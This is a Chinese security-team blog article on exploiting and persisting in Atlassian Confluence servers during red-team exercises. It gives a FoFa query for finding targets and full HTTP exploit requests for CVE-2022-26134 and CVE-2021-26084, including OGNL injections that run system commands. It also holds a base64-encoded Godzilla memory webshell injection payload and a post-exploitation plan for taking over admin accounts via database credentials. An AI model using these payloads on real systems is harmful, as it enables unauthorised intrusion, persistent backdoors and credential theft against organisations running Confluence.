#  攻防演练confluence后利用

[ 夜组安全 ](javascript:void\(0\);)

**夜组安全** ![]()

微信号 NightCrawler_Team

功能介绍 "恐惧就是貌似真实的伪证" NightCrawler Team(简称:夜组)主攻WEB安全 | 内网渗透 | 红蓝对抗 | 代码审计 |
APT攻击，致力于将每一位藏在暗处的白帽子聚集在一起，在夜空中划出一道绚丽的光线！

____

___发表于_

收录于合集

以下文章来源于PandaSec ，作者paul

![](http://wx.qlogo.cn/mmhead/Q3auHgzwzM4p60GoIJJ8yplZROTdYwhOJj1IEvdLYibCsX61cvu36wg/0)
**PandaSec** .

一个攻防团队

声明：该公众号分享的安全工具和项目均来源于网络，仅供安全研究与学习之用，如用于其他用途，由使用者承担全部法律及连带责任，与工具作者和本公众号无关。

 **01 前言**

Confluence是一个专业的企业知识管理与协同软件，也可以用于构建企业wiki。使用简单，它强大的编辑和站点管理特征能够帮助团队成员之间共享信息、文档协作、集体讨论，信息推送。

  

 **02 利用思路**

1、getshell

2、找配置文件中数据库信息

3、修改管理员密码

4、添加用户，加入管理员组

5、还原管理员密码

  

 **03 CVE-2022-26134**

 **漏洞描述**

远程攻击者在未经身份验证的情况下，可构造OGNL表达式进行注入，实现在Confluence Server或Data Center上执行任意代码。

 **影响版本**

Confluence Server and Data Center >= 1.3.0

Confluence Server and Data Center < 7.4.17

Confluence Server and Data Center < 7.13.7

Confluence Server and Data Center < 7.14.3

Confluence Server and Data Center < 7.15.2

Confluence Server and Data Center < 7.16.4

Confluence Server and Data Center < 7.17.4

Confluence Server and Data Center < 7.18.1

 **网络测绘**

FoFa语法：app="ATLASSIAN-Confluence"

 **漏洞复现**

1、漏洞检测：

https://github.com/jbaines-r7/through_the_wire

  *   *   *   *   *   *   *   *   *   * 

    
    
    GET //%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/ HTTP/1.1Host: 192.168.164.129:9080Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: JSESSIONID=3764D915B037D5A50D8025AA793E990AConnection: close  
    

在getshell的过程中，如果是遇到在Linux的中搭建的confluence，shell后默认为Confluence用户，是没有文件写权限的，能够执行命令但是shell
不容易写进去，所以直接选择打内存马的方式。

 **注入内存马** ：

https://github.com/BeichenDream/CVE-2022-26134-Godzilla-MEMSHELL

![](https://gitee.com/fuli009/images/raw/master/public/20230629083534.png)

![](https://gitee.com/fuli009/images/raw/master/public/20230629083536.png)

提取jar中的exp供大家学习，后续公众号也会发关于内存马的文章：  

exp我就不帮大家解码了，相信大家都会。  

  *   *   *   *   *   *   *   *   * 

    
    
    POST /%24%7B%23a%3Dnew%20javax.script.ScriptEngineManager().getEngineByName(%22js%22).eval(%40com.opensymphony.webwork.ServletActionContext%40getRequest().getParameter(%22search%22)).(%40com.opensymphony.webwork.ServletActionContext%40getResponse().setHeader(%22X-Status%22%2C%22ok%22))%7D/ HTTP/1.1Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36Host: 119.23.63.96:8090Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2Connection: closeContent-Length: 12136  
    search=var+classBytes+%3D+java.util.Base64.getDecoder%28%29.decode%28%22yv66vgAAADQBjwoAaADRCgBoANIJAEwA0wkATADUCADVCgAMANYHANcIANgHANkKANoA2woA2gDcBwDdCgDeAN8KAEwA4AoATADhBwDiCADjCADkCgAMAOUHAOYKAOcA6AgA6QoATADqCADrCgBMAOwKABQA7QgA7goADADvCgDnAPAIAPEKAOcA8ggA8woALwD0CgBMAPUHAPYKACMA0goAIwD3CgAjAPgHAKkKAEwA%2BQoADAD6BwD7CgAMAPwKACoA8AoAKgD9CACxBwD%2BCAC1CAD%2FCgEAAQEHAQIJAEwBAwoALwEECgAzAQUKAQABBgoBAAEHCAEICgEJAQoKAC8BCwoBCQEMBwENCgEJAQ4KAD0BDwoAPQEQCgAvAREIARIKAEwBEwgBFAoALwEVCQBMARYKAEwBFwoBGAEZCgEaARsKAEwBHAkATAEdBwGNCgAMAR8KAEwA0QoATAEgBwEhCgBQANIKAAwBIgoAFAD0CgAUASMHASQKAFUA0goAVQElCgBVASMKAEwBJgoAUAEnCACJCADGCAEoBwEpCgAvASoKAF4BKwoBGAEsCgBQAS0KAS4BLwoALwEwCgBeATEKAF4BMgoAFADSBwEzBwE0AQALaW5pdGlhbGl6ZWQBAAFaAQAEbG9jawEAEkxqYXZhL2xhbmcvT2JqZWN0OwEADHBheWxvYWRDbGFzcwEAEUxqYXZhL2xhbmcvQ2xhc3M7AQAIcGFzc3dvcmQBABJMamF2YS9sYW5nL1N0cmluZzsBAANrZXkBAAY8aW5pdD4BABooTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAPTG1haW4vTWVtU2hlbGw7AQAGbG9hZGVyAQAXTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAMoKVYBAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQAbc2VydmxldFJlcXVlc3RMaXN0ZW5lckNsYXNzAQANU3RhY2tNYXBUYWJsZQcBjQcA5gcA3QcA1wcA2QcA4gEAEmdldFN0YW5kYXJkQ29udGV4dAEAFCgpTGphdmEvbGFuZy9PYmplY3Q7AQAHcmVxdWVzdAEADnNlcnZsZXRDb250ZXh0AQALYWRkTGlzdGVuZXIBADgoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvU3RyaW5nOwEACGxpc3RlbmVyAQAPc3RhbmRhcmRDb250ZXh0AQAhYWRkQXBwbGljYXRpb25FdmVudExpc3RlbmVyTWV0aG9kAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAApFeGNlcHRpb25zAQAGaW52b2tlAQBTKExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBABNzZXJ2bGV0UmVxdWVzdEV2ZW50AQAFcHJveHkBAAZtZXRob2QBAARhcmdzAQATW0xqYXZhL2xhbmcvT2JqZWN0OwEADGludm9rZU1ldGhvZAEASyhMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAAm8xAQABaQEAAUkBAAdjbGFzc2VzAQAVTGphdmEvdXRpbC9BcnJheUxpc3Q7AQADb2JqAQAKbWV0aG9kTmFtZQEACnBhcmFtZXRlcnMHAPYHAP4HAJgBABBnZXRNZXRob2RCeUNsYXNzAQBRKExqYXZhL2xhbmcvQ2xhc3M7TGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQACY3MBABJbTGphdmEvbGFuZy9DbGFzczsHATUBAA1nZXRGaWVsZFZhbHVlAQA4KExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsBAAlmaWVsZE5hbWUBAAFmAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwcA%2BwEADGdldFBhcmFtZXRlcgEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQANcmVxdWVzdE9iamVjdAEABG5hbWUBAA5nZXRDb250ZW50VHlwZQEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9TdHJpbmc7AQADYWVzAQAHKFtCWilbQgEAAWMBABVMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAFzAQACW0IBAAFtBwC8BwE2AQADbWQ1AQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAB1MamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwEAA3JldAEACGJhY2tEb29yAQAVKExqYXZhL2xhbmcvT2JqZWN0OylWAQAIcmVzcG9uc2UBAAtwcmludFdyaXRlcgEAFUxqYXZhL2lvL1ByaW50V3JpdGVyOwEABmFyck91dAEAH0xqYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbTsBAARkYXRhAQAFdmFsdWUBAAtjb250ZW50VHlwZQEACDxjbGluaXQ%2BAQAKU291cmNlRmlsZQEADU1lbVNoZWxsLmphdmEMAHMAdAwAcwB8DABsAG0MAGoAawEAJmpha2FydGEuc2VydmxldC5TZXJ2bGV0UmVxdWVzdExpc3RlbmVyDAE3ATgBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAkamF2YXguc2VydmxldC5TZXJ2bGV0UmVxdWVzdExpc3RlbmVyAQAgamF2YS9sYW5nL0NsYXNzTm90Rm91bmRFeGNlcHRpb24HATkMAToBOwwBPAE9AQAPamF2YS9sYW5nL0NsYXNzBwE%2BDAE%2FAUAMAIcAiAwAiwCMAQATamF2YS9sYW5nL1Rocm93YWJsZQEALWNvbS5vcGVuc3ltcGhvbnkud2Vid29yay5TZXJ2bGV0QWN0aW9uQ29udGV4dAEACmdldFJlcXVlc3QMAUEBQgEAEGphdmEvbGFuZy9PYmplY3QHATUMAJIBQwEAEWdldFNlcnZsZXRDb250ZXh0DACZAJoBAAdjb250ZXh0DACrAKwMAUQBRQEAG2FkZEFwcGxpY2F0aW9uRXZlbnRMaXN0ZW5lcgwBRgFCDAFHAUgBAAJvawwBSQFKAQAScmVxdWVzdEluaXRpYWxpemVkDAFLAUwMAMQAxQEAE2phdmEvdXRpbC9BcnJheUxpc3QMAU0BTAwBTgFPDACmAKcMAVABRQEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkDAFRAVIMAVMBVAEAEGphdmEvbGFuZy9TdHJpbmcBAANBRVMHATYMAVUBVgEAH2phdmF4L2NyeXB0by9zcGVjL1NlY3JldEtleVNwZWMMAHIAcQwBVwFYDABzAVkMAVoBWwwBXAFdAQADTUQ1BwFeDAFVAV8MAWABYQwBYgFjAQAUamF2YS9tYXRoL0JpZ0ludGVnZXIMAWQBWAwAcwFlDAFmAWcMAWgBSgEAEWdldFNlcnZsZXRSZXF1ZXN0DAC1ALYBACFhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQMAWkBagwAcABxDACxALIHAWsMAWwBbwcBcAwBcQFyDAC3ALgMAG4AbwEADW1haW4vTWVtU2hlbGwMAXMBPQwBdAF1AQAdamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW0MAXYAiAwBZgFKAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMAXcBeAwAwADBDAF5AWEBAAlnZXRXcml0ZXIBABNqYXZhL2lvL1ByaW50V3JpdGVyDAF6AXsMAXwBfQwBfgGADAGBAVgHAYIMAYMBhAwBegFnDAGFAHwMAYYAfAEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAI2phdmEvbGFuZy9yZWZsZWN0L0ludm9jYXRpb25IYW5kbGVyAQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQATamF2YXgvY3J5cHRvL0NpcGhlcgEAB2Zvck5hbWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAQamF2YS9sYW5nL1RocmVhZAEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwEAFWdldENvbnRleHRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBABdqYXZhL2xhbmcvcmVmbGVjdC9Qcm94eQEAEG5ld1Byb3h5SW5zdGFuY2UBAGIoTGphdmEvbGFuZy9DbGFzc0xvYWRlcjtbTGphdmEvbGFuZy9DbGFzcztMamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvbkhhbmRsZXI7KUxqYXZhL2xhbmcvT2JqZWN0OwEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBABFnZXREZWNsYXJlZE1ldGhvZAEADXNldEFjY2Vzc2libGUBAAQoWilWAQAHZ2V0TmFtZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAGZXF1YWxzAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQADYWRkAQAHdG9BcnJheQEAKChbTGphdmEvbGFuZy9PYmplY3Q7KVtMamF2YS9sYW5nL09iamVjdDsBAA1nZXRTdXBlcmNsYXNzAQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQALZ2V0SW5zdGFuY2UBACkoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEACGdldEJ5dGVzAQAEKClbQgEAFyhbQkxqYXZhL2xhbmcvU3RyaW5nOylWAQAEaW5pdAEAFyhJTGphdmEvc2VjdXJpdHkvS2V5OylWAQAHZG9GaW5hbAEABihbQilbQgEAG2phdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdAEAMShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdDsBAAZsZW5ndGgBAAMoKUkBAAZ1cGRhdGUBAAcoW0JJSSlWAQAGZGlnZXN0AQAGKElbQilWAQAIdG9TdHJpbmcBABUoSSlMamF2YS9sYW5nL1N0cmluZzsBAAt0b1VwcGVyQ2FzZQEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQAQamF2YS91dGlsL0Jhc2U2NAEACmdldERlY29kZXIBAAdEZWNvZGVyAQAMSW5uZXJDbGFzc2VzAQAcKClMamF2YS91dGlsL0Jhc2U2NCREZWNvZGVyOwEAGGphdmEvdXRpbC9CYXNlNjQkRGVjb2RlcgEABmRlY29kZQEAFihMamF2YS9sYW5nL1N0cmluZzspW0IBAA5nZXRDbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsBAAtuZXdJbnN0YW5jZQEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEABHNpemUBAAlzdWJzdHJpbmcBABYoSUkpTGphdmEvbGFuZy9TdHJpbmc7AQAFd3JpdGUBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAApnZXRFbmNvZGVyAQAHRW5jb2RlcgEAHCgpTGphdmEvdXRpbC9CYXNlNjQkRW5jb2RlcjsBAAt0b0J5dGVBcnJheQEAGGphdmEvdXRpbC9CYXNlNjQkRW5jb2RlcgEADmVuY29kZVRvU3RyaW5nAQAWKFtCKUxqYXZhL2xhbmcvU3RyaW5nOwEABWZsdXNoAQAFY2xvc2UJAIEBFgEABHBhc3MIAYgJAIEBAwEAEDc0Mzc4YjE5YjczNmFmMjAIAYsBADdjb20vb3BlbnN5bXBob255L3h3b3JrL2FmZDdhOTUzMjkwMTRmMzFiZmE0MzE2MjViM2MzMGJkAQA5TGNvbS9vcGVuc3ltcGhvbnkveHdvcmsvYWZkN2E5NTMyOTAxNGYzMWJmYTQzMTYyNWIzYzMwYmQ7ACEATABoAAEAaQAFAAoAagBrAAAACgBsAG0AAAAKAG4AbwAAAAoAcABxAAAACgByAHEAAAAOAAEAcwB0AAEAdQAAAD4AAgACAAAABiortwABsQAAAAIAdgAAAAoAAgAAABIABQATAHcAAAAWAAIAAAAGAHgBjgAAAAAABgB6AHsAAQABAHMAfAABAHUAAAFFAAYABgAAAFsqtwACsgADWUzCsgAEmgBBAU0SBbgABk2nAA9OEgi4AAZNpwAFOgQsxgAeKrgACrYACwS9AAxZAyxTKrgADSq3AA63AA9XpwAETQSzAAQrw6cACjoFK8MZBb%2BxAAUAEgAYABsABwAcACIAJQAJABAARgBJABAACgBQAFMAAABTAFcAUwAAAAMAdgAAAEYAEQAAABQABAAVAAoAFgAQABgAEgAaABgAIQAbABsAHAAdACIAIAAlAB4AJwAiACsAIwBGACcASQAlAEoAKABOACoAWgArAHcAAAAgAAMAHAALAH0AfgADABIANAB%2FAG8AAgAAAFsAeAGOAAAAgAAAAD4ACf8AGwADBwCBBwCCBwCDAAEHAIT%2FAAkABAcAgQcAggcAgwcAhAABBwCF%2BgAB%2BgAeQgcAhgADRAcAhvoABgACAIcAiAABAHUAAACeAAQAAwAAADISEbgABhISA70ADLYAEwEDvQAUtgAVTCorEhYDvQAUtwAXTSwSGLgAGRIYuAAZsEwBsAABAAAALgAvAAcAAwB2AAAAFgAFAAAAMAAXADEAIwAyAC8AMwAwADUAdwAAACoABAAXABgAiQBtAAEAIwAMAIoAbQACADAAAgB9AH4AAQAAADIAeAGOAAAAgAAAAAYAAW8HAIQAAgCLAIwAAgB1AAAAfQAGAAQAAAApLLYAGhIbBL0ADFkDEhRTtgAcTi0EtgAdLSwEvQAUWQMrU7YAFVcSHrAAAAACAHYAAAASAAQAAAA6ABMAOwAYADwAJgA9AHcAAAAqAAQAAAApAHgBjgAAAAAAKQCNAG0AAQAAACkAjgBtAAIAEwAWAI8AkAADAJEAAAAEAAEABwABAJIAkwACAHUAAACAAAIABQAAABkstgAfEiC2ACGZAA4tAzI6BCoZBLcAIgGwAAAAAwB2AAAAEgAEAAAAQgAMAEMAEQBEABcARgB3AAAANAAFABEABgCUAG0ABAAAABkAeAGOAAAAAAAZAJUAbQABAAAAGQCWAJAAAgAAABkAlwCYAAMAgAAAAAMAARcAkQAAAAQAAQAQAIIAmQCaAAEAdQAAATgABQAHAAAAY7sAI1m3ACQ6BC3GADMDNgUVBS2%2BogApLRUFMjoGGQbGABEZBBkGtgAatgAlV6cAChkEAbYAJVeEBQGn%2F9YqK7YAGiwZBAO9AAy2ACbAACfAACe3ACg6BRkFKy22ABWwOgQBsAABAAAAXgBfAAcAAwB2AAAAMgAMAAAASwAJAEwADQBNABcATgAdAE8AIgBQADAAUgA3AE0APQBWAFcAWABfAFkAYQBcAHcAAABSAAgAHQAaAJsAbQAGABAALQCcAJ0ABQAJAFYAngCfAAQAVwAIAJYAkAAFAAAAYwB4AY4AAAAAAGMAoABtAAEAAABjAKEAcQACAAAAYwCiAJgAAwCAAAAAKwAF%2FQAQBwCjAfwAHwcAgvoABvoABf8AIQAEBwCBBwCCBwCkBwClAAEHAIQAggCmAKcAAQB1AAAAuAADAAYAAAAhAToEK8YAGissLbYAEzoEAUyn%2F%2FI6BSu2AClMp%2F%2FoGQSwAAEABwARABQABwADAHYAAAAmAAkAAABfAAMAYAAHAGIADwBjABEAZgAUAGQAFgBlABsAZgAeAGgAdwAAAD4ABgAWAAUAfQB%2BAAUAAAAhAHgBjgAAAAAAIQCoAG8AAQAAACEAoQBxAAIAAAAhAKIAqQADAAMAHgCWAJAABACAAAAADQAD%2FAADBwCqUAcAhAkACQCrAKwAAgB1AAAA%2BAACAAYAAABCAU0qwQAqmQALKsAAKk2nACkBTiq2ABo6BBkExgAcGQQrtgArTQE6BKf%2F8ToFGQS2ACk6BKf%2F5SwEtgAsLCq2AC2wAAEAHgAoACsABwADAHYAAAA6AA4AAABrAAIAbAAJAG0AEQBvABMAcAAZAHEAHgBzACUAdAAoAHcAKwB1AC0AdgA0AHcANwB6ADwAewB3AAAAPgAGAC0ABwB9AH4ABQATACQAlgCQAAMAGQAeAKgAbwAEAAAAQgCgAG0AAAAAAEIArQBxAAEAAgBAAK4ArwACAIAAAAAYAAT8ABEHALD9AAcHAKoHAINRBwCE%2BQALAJEAAAAEAAEABwABALEAsgABAHUAAABRAAcAAwAAABMqKxIuBL0AFFkDLFO3ABfAAC%2BwAAAAAgB2AAAABgABAAAAfgB3AAAAIAADAAAAEwB4AY4AAAAAABMAswBtAAEAAAATALQAcQACAAEAtQC2AAEAdQAAAEMABAACAAAADyorEjADvQAUtwAXwAAvsAAAAAIAdgAAAAYAAQAAAIEAdwAAABYAAgAAAA8AeAGOAAAAAAAPALMAbQABAAEAtwC4AAEAdQAAANcABgAEAAAAKxIxuAAyTi0cmQAHBKcABAW7ADNZsgA0tgA1EjG3ADa2ADctK7YAOLBOAbAAAQAAACcAKAAHAAMAdgAAABYABQAAAIcABgCIACIAiQAoAIoAKQCLAHcAAAA0AAUABgAiALkAugADACkAAgB9AH4AAwAAACsAeAGOAAAAAAArALsAvAABAAAAKwC9AGsAAgCAAAAAPAAD%2FwAPAAQHAIEHAL4BBwC%2FAAEHAL%2F%2FAAAABAcAgQcAvgEHAL8AAgcAvwH%2FABcAAwcAgQcAvgEAAQcAhAAJAMAAwQABAHUAAACPAAQAAwAAADABTBI5uAA6TSwqtgA1Ayq2ADu2ADy7AD1ZBCy2AD63AD8QELYAQLYAQUynAARNK7AAAQACACoALQAHAAMAdgAAAAYAAQAAAI8AdwAAACAAAwAIACIAvQDCAAIAAAAwALsAcQAAAAIALgDDAHEAAQCAAAAAEwAC%2FwAtAAIHAKQHAKQAAQcAhAAAAgDEAMUAAQB1AAACYQAFAAsAAAEfKisSQgO9ABS3ABdNKiy2AENOLcYBAy0SRLYARZkA%2BiossgBGtgBHOgQZBMYA67gASBkEtgBJOgUqGQUDtgBKOgUZBcYA0xkFvp4AzbIAS8cAILsATFkstgAatgBNtwBOGQUDGQW%2BtgBPswBLpwCquwBQWbcAUToGsgBLtgBSOgcZBxkGtgBTVxkHLLYAU1cZBxkFtgBTVxkHtgBUV7sAVVm3AFayAEa2AFeyADS2AFe2AFi4AFk6CBkGtgBangBZLBJbuAAZEly4ABk6CSoZCRJdA70AFLcAF8AAXjoKGQoZCAMQELYAX7YAYBkKuABhKhkGtgBiBLYASrYAY7YAYBkKGQgQELYAZLYAYBkKtgBlGQq2AGanAAROpwAETbEAAgAMARYBGQAQAAABGgEdAAcAAwB2AAAAegAeAAAAkwAMAJcAEgCYAB8AmQApAJoALgCbADgAnABBAJ0ATACeAFIAnwBvAKEAeACiAIAAowCIAKQAjwClAJcApgCdAKcAuACoAMAAqQDNAKoA3gCrAOsArAEAAK0BDACuAREArwEWALcBGQC2ARoAuwEdALkBHgC8AHcAAABwAAsAzQBJAMYAbQAJAN4AOADHAMgACgB4AJ4AyQDKAAYAgACWAK4AbQAHALgAXgDAAHEACAA4AN4AywC8AAUAKQDtAMwAcQAEABIBBADNAHEAAwAMAQ4AiQBtAAIAAAEfAHgBjgAAAAABHwCUAG0AAQCAAAAAKgAG%2FwBvAAYHAIEHAIIHAIIHAKQHAKQHAL4AAPgApkIHAIb6AABCBwCEAAAIAM4AfAABAHUAAAA3AAIAAAAAABsTAYmzAYcTAYyzAYoDswAEuwAUWbcAZ7MAA7EAAAABAHYAAAAKAAIADAAMABAADQACAM8AAAACANABbgAAABIAAgEaARgBbQAJAS4BGAF%2FAAk%3D%22%29%3B%0D%0Avar+loader+%3D+java.lang.Thread.currentThread%28%29.getContextClassLoader%28%29%3B%0D%0Avar+reflectUtilsClass+%3D+java.lang.Class.forName%28%22org.springframework.cglib.core.ReflectUtils%22%2Ctrue%2Cloader%29%3B%0D%0Avar+urls+%3D+java.lang.reflect.Array.newInstance%28java.lang.Class.forName%28%22java.net.URL%22%29%2C0%29%3B%0D%0A%0D%0Avar+params+%3D+java.lang.reflect.Array.newInstance%28java.lang.Class.forName%28%22java.lang.Class%22%29%2C3%29%3B%0D%0Aparams%5B0%5D+%3D+java.lang.Class.forName%28%22java.lang.String%22%29%3B%0D%0Aparams%5B1%5D+%3D+java.lang.Class.forName%28%22%5BB%22%29%3B%0D%0Aparams%5B2%5D+%3D+java.lang.Class.forName%28%22java.lang.ClassLoader%22%29%3B%0D%0A%0D%0A%0D%0Avar+defineClassMethod+%3D+reflectUtilsClass.getMethod%28%22defineClass%22%2Cparams%29%3B%0D%0A%0D%0Aparams+%3D++java.lang.reflect.Array.newInstance%28java.lang.Class.forName%28%22java.lang.Object%22%29%2C3%29%3B%0D%0A%0D%0Aparams%5B0%5D+%3D+%22com.opensymphony.xwork.afd7a95329014f31bfa431625b3c30bd%22%3B%0D%0Aparams%5B1%5D+%3D+classBytes%3B%0D%0Aparams%5B2%5D+%3D+loader%3B%0D%0AdefineClassMethod.invoke%28null%2Cparams%29.newInstance%28%29%3B%0D%0A%22ok%22%3B%0D%0A

  

 **04  ** **CVE-2021-26084**

 **漏洞描述**

OGNL表达式注入代码执行漏洞（CVE-2021-26084）其部分版本测试版本 7.4.10

版本小于7.13.0，有多个接口存在这个OGNL表达式注入漏洞

 **受影响版本**

  *   *   *   *   * 

    
    
     Confluence < 6.13.236.14.0 ≤ Confluence < 7.4.117.5.0 ≤ Confluence < 7.11.67.12.0 ≤ Confluence < 7.12.5Confluence < 7.13.0

 **不受影响版本**

  *   *   *   *   * 

    
    
     Confluence=6.13.23Confluence=7.4.11Confluence=7.11.6Confluence=7.12.5Confluence=7.13.0

  

 **漏洞验证**

如果存在如下url目录，说明存在该漏洞。

/pages/doenterpagevariables.action

/pages/createpage-entervariables.action

 **漏洞利用**

  *   *   *   *   *   *   *   *   *   *   *   * 

    
    
     POST /pages/doenterpagevariables.action HTTP/1.1Host: x.x.x.xAccept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 47  
      
    queryString=%5cu0027%2b%7bClass.forName%28%5cu0027javax.script.ScriptEngineManager%5cu0027%29.newInstance%28%29.getEngineByName%28%5cu0027JavaScript%5cu0027%29.%5cu0065val%28%5cu0027var+isWin+%3d+java.lang.System.getProperty%28%5cu0022os.name%5cu0022%29.toLowerCase%28%29.contains%28%5cu0022win%5cu0022%29%3b+var+cmd+%3d+new+java.lang.String%28%5cu0022ifconfig%5cu0022%29%3bvar+p+%3d+new+java.lang.ProcessBuilder%28%29%3b+if%28isWin%29%7bp.command%28%5cu0022cmd.exe%5cu0022%2c+%5cu0022%2fc%5cu0022%2c+cmd%29%3b+%7d+else%7bp.command%28%5cu0022bash%5cu0022%2c+%5cu0022-c%5cu0022%2c+cmd%29%3b+%7dp.redirectErrorStream%28true%29%3b+var+process%3d+p.start%28%29%3b+var+inputStreamReader+%3d+new+java.io.InputStreamReader%28process.getInputStream%28%29%29%3b+var+bufferedReader+%3d+new+java.io.BufferedReader%28inputStreamReader%29%3b+var+line+%3d+%5cu0022%5cu0022%3b+var+output+%3d+%5cu0022%5cu0022%3b+while%28%28line+%3d+bufferedReader.readLine%28%29%29+%21%3d+null%29%7boutput+%3d+output+%2b+line+%2b+java.lang.Character.toString%2810%29%3b+%7d%5cu0027%29%7d%2b%5cu0027

![](https://gitee.com/fuli009/images/raw/master/public/20230629083537.png)

 **  
**

 **内存马**

全版本内存马注入

https://mp.weixin.qq.com/s/wbIvFQmkdJH6g6ZKBFXyYQ  
  

jdk9-11高版本内存马注入demo:

  *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    POST /%24%7BClass%2EforName%28%22com%2Eopensymphony%2Ewebwork%2EServletActionContext%22%29%2EgetMethod%28%22getResponse%22%2Cnull%29%2Einvoke%28null%2Cnull%29%2EsetHeader%28%22AuthValidate%22%2CClass%2EforName%28%22javax%2Escript%2EScriptEngineManager%22%29%2EnewInstance%28%29%2EgetEngineByName%28%22nashorn%22%29%2Eeval%28Class%2EforName%28%22com%2Eopensymphony%2Ewebwork%2EServletActionContext%22%29%2EgetMethod%28%22getRequest%22%2Cnull%29%2Einvoke%28null%2Cnull%29%2EgetParameter%28%22code%22%29%29%29%7D/ HTTP/1.1Host: xxxxxxAccept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36Connection: closeContent-Length: 18307Access-Control-Allow-Method: GETContent-Type: application/x-www-form-urlencoded  
